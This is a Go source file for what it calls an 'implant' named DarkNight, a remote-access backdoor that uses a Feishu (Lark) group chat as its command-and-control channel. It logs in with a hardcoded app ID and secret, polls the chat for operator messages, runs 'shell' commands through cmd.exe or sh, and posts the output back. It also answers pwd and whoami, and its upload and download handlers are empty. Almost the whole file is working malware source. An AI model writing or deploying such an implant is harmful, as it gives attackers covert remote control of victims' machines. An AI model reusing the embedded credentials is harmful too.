package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strings"
	"text/template"
	"time"
)

// base64 编码
func base64Encode(plain string) string {
	return base64.StdEncoding.EncodeToString([]byte(plain))
}

// base64 解码
func base64Decode(encoded string) (string, error) {
	decodedBytes, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", err
	}
	return string(decodedBytes), nil
}

// 获取当前工作目录
func pwd() string {
	dir, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf("Failed in GetCurrentDirectory: %v", err)
	}
	return dir
}

// 获取计算机名称和用户名称
func whoami() string {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		// Windows 系统，使用 cmd.exe /C
		cmd = exec.Command("cmd.exe", "/C", "whoami")
	case "linux", "darwin":
		cmd = exec.Command("sh", "-c", "whoami")
	default:
		return "Unsupported OS"

	}
	username, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed to execute command: %v", err)
	}
	return string(username)
}

// 执行 shell 命令
func shell(command string) string {
	var cmd *exec.Cmd

	// 检查操作系统并选择对应的命令执行方式
	switch runtime.GOOS {
	case "windows":
		// Windows 系统，使用 cmd.exe /C
		cmd = exec.Command("cmd.exe", "/C", command)
	case "linux", "darwin": // darwin 是 macOS 的 GOOS 名
		// Linux 和 macOS 系统，使用 sh -c
		cmd = exec.Command("sh", "-c", command)
	default:
		return "Unsupported OS"
	}

	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed to execute command: %v", err)
	}
	return string(out)
}

func get_tenant_access_token(app_id string, app_secret string) (string, error) {
	url := "https://open.feishu.cn/open-apis/auth/v3/app_access_token/internal"
	// 创建请求体的JSON数据
	requestBody := map[string]string{
		"app_id":     app_id,
		"app_secret": app_secret,
	}
	// 将请求体编码为JSON
	jsonData, err := json.Marshal(requestBody)
	if err != nil {
		return "", fmt.Errorf("Error encoding JSON: %s\n", err)
	}

	// 创建HTTP请求
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf("Error creating request: %s\n", err)
	}

	// 设置请求头，指定内容类型为JSON
	req.Header.Set("Content-Type", "application/json")

	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("Error sending request: %s\n", err)
	}
	defer resp.Body.Close()

	// 读取响应体
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("Error reading response: %s\n", err)
	}

	// 解析响应体中的JSON数据
	var responseBody map[string]interface{}
	err = json.Unmarshal(body, &responseBody)
	if err != nil {
		return "", fmt.Errorf("Error decoding JSON: %s\n", err)
	}

	// 提取tenant_access_token
	tenantAccessToken, ok := responseBody["tenant_access_token"].(string)
	if !ok {
		return "", fmt.Errorf("Failed to extract tenant_access_token")
	}
	//fmt.Println(tenantAccessToken)
	return tenantAccessToken, nil
}

// Response 是整个JSON响应的结构体
type Response struct {
	Code int `json:"code"`
	Data struct {
		HasMore   bool   `json:"has_more"`
		Items     []Item `json:"items"`
		PageToken string `json:"page_token"`
	} `json:"data"`
	Msg string `json:"msg"`
}

// Item 是data中items数组的元素结构体
type Item struct {
	Avatar      string `json:"avatar"`
	ChatID      string `json:"chat_id"`
	ChatStatus  string `json:"chat_status"`
	Description string `json:"description"`
	External    bool   `json:"external"`
	Name        string `json:"name"`
	OwnerID     string `json:"owner_id"`
	OwnerIDType string `json:"owner_id_type"`
	TenantKey   string `json:"tenant_key"`
	CreateTime  string `json:"create_time"`
	Deleted     bool   `json:"deleted"`
	MessageId   string `json:"message_id"`
	MsgType     string `json:"msg_type"`
	Body        struct {
		Content string `json:"content"`
	}
	Sender struct {
		ID         string `json:"id"`
		IDType     string `json:"id_type"`
		SenderType string `json:"sender_type"`
		TenantKey  string `json:"tenant_key"`
	} `json:"sender"`
	UpdateTime string `json:"Update_time"`
	Updated    bool   `json:"updated"`
}

func get_chat_group(tenant_access_token string) (string, error) {
	url := "https://open.feishu.cn/open-apis/im/v1/chats"
	// 创建HTTP请求
	req, _ := http.NewRequest("GET", url, nil)
	// 设置请求头，指定内容类型为JSON
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", tenant_access_token))
	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("Error sending request: %s\n", err)
	}
	defer resp.Body.Close()
	// 读取响应体
	body, _ := ioutil.ReadAll(resp.Body)
	// 解析响应体中的JSON数据
	var responseBody Response
	err = json.Unmarshal(body, &responseBody)
	data := responseBody.Data.Items[0]
	chat_id := data.ChatID
	//fmt.Println(" [+] chat_id:",chat_id)
	return chat_id, nil

}

func get_last_history_message(tenant_access_token string, chat_id string) (string, string, string, error) {
	url := fmt.Sprintf("https://open.feishu.cn/open-apis/im/v1/messages?container_id=%s&container_id_type=chat&sort_type=ByCreateTimeDesc&page_size=1", chat_id)
	// 创建HTTP请求
	req, _ := http.NewRequest("GET", url, nil)
	// 设置请求头，指定内容类型为JSON
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", tenant_access_token))

	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", "", fmt.Errorf("Error sending request: %s\n", err)
	}
	defer resp.Body.Close()
	// 读取响应体
	body, _ := ioutil.ReadAll(resp.Body)
	// 解析响应体中的JSON数据
	var responseBody Response
	err = json.Unmarshal(body, &responseBody)

	// 截取最后一条消息
	items := responseBody.Data.Items
	//fmt.Println(items)
	len := len(items)
	body_content := items[len-1].Body.Content
	msg_type := items[len-1].MsgType
	sender_type := items[len-1].Sender.SenderType

	return body_content, msg_type, sender_type, nil
}

func bot_send_text_message(tenant_access_token string, chat_id string, message_text string) (string, error) {
	req_url := "https://open.feishu.cn/open-apis/im/v1/messages?receive_id_type=chat_id"
	var buf bytes.Buffer
	template.JSEscape(&buf, []byte(message_text))
	encodedString := buf.String()
	// 创建请求体的JSON数据
	requestBody := map[string]string{
		"content":    fmt.Sprintf("{\"text\":\"%s\"}", encodedString),
		"msg_type":   "text",
		"receive_id": chat_id,
	}
	// 将请求体编码为JSON
	jsonData, err := json.Marshal(requestBody)
	if err != nil {
		return "", fmt.Errorf("Error encoding JSON: %s\n", err)
	}

	// 创建HTTP请求
	req, err := http.NewRequest("POST", req_url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", fmt.Errorf("Error creating request: %s\n", err)
	}

	// 设置请求头，指定内容类型为JSON
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", tenant_access_token))

	// 发送请求
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("Error sending request: %s\n", err)
	}
	defer resp.Body.Close()
	// 读取响应体
	body, _ := ioutil.ReadAll(resp.Body)
	// 解析响应体中的JSON数据
	var responseBody Response
	err = json.Unmarshal(body, &responseBody)
	msg := responseBody.Msg
	fmt.Println("send message status:", msg)

	return msg, nil
}

func main() {
	fmt.Println("Welcome to the DarkNight")
	//if len(os.Args) < 3 {
	//	fmt.Println("Usage: implant <app_id> <app_secret>")
	//	return
	//}
	app_id := "cli_a79a4d7707f8500d"
	app_secret := "QbaercW9AEznAj0BkhBGweqPgaCdj2bT"

	tenant_access_token, err := get_tenant_access_token(app_id, app_secret)
	if err != nil {
		fmt.Println(" [-] tenant_access_token get fail, please try again")
		return
	}
	fmt.Println(" [+] tenant_access_token:", tenant_access_token)

	chat_id, err := get_chat_group(tenant_access_token)
	if err != nil {
		fmt.Println(" [-] chat_id get fail, please try again")
		return
	}
	fmt.Println(" [+] chat_id:", chat_id)

	for {
		// 检测当前最后一条历史消息是否为start启动命令
		body_content, _, _, _ := get_last_history_message(tenant_access_token, chat_id)
		// 编译正则表达式
		re := regexp.MustCompile(`"[^"]*":"(.*?)"`)
		// 使用正则表达式查找匹配项
		real_content := re.FindStringSubmatch(body_content)[1]
		if real_content == "start" {
			if _, err := bot_send_text_message(tenant_access_token, chat_id, " [*] my friend, i am ready, rush now!!!"); err != nil {
				fmt.Println(" [-] start failed, please check your chat_group!")
			}
			fmt.Println(" [+] implant is already in place!")
			for {
				body_content, _, _, _ := get_last_history_message(tenant_access_token, chat_id)
				// 编译正则表达式
				re := regexp.MustCompile(`"[^"]*":"(.*?)"`)
				// 使用正则表达式查找匹配项
				real_content := re.FindStringSubmatch(body_content)[1]
				//fmt.Println("now command is: ", real_content)
				if real_content == "exit" {
					if _, err := bot_send_text_message(tenant_access_token, chat_id, " [*] goodbye my friend, see you next time!!!"); err != nil {
						fmt.Println(" [-] exit failed, please check your chat_group!")
					}
					break
				}
				if real_content == "pwd" {
					result := fmt.Sprintf(" [+] `%s` Result: %s", real_content, pwd())
					bot_send_text_message(tenant_access_token, chat_id, result)
				}
				if real_content == "whoami" {
					result := fmt.Sprintf(" [+] `%s` Result: %s", real_content, whoami())
					bot_send_text_message(tenant_access_token, chat_id, result)
				}
				if strings.HasPrefix(real_content, "shell") {
					command := strings.TrimPrefix(real_content, "shell ")
					result := fmt.Sprintf(" [+] `%s` Result: %s", command, shell(command))
					bot_send_text_message(tenant_access_token, chat_id, result)
				}
				if strings.HasPrefix(real_content, "upload") {

				}
				if strings.HasPrefix(real_content, "download") {

				}

				time.Sleep(3 * time.Second)
				fmt.Println("waiting for the master enter command...")
			}
			break
		} else {
			time.Sleep(3 * time.Second)
			fmt.Println("waiting for the start signal...")
			continue
		}
	}
}
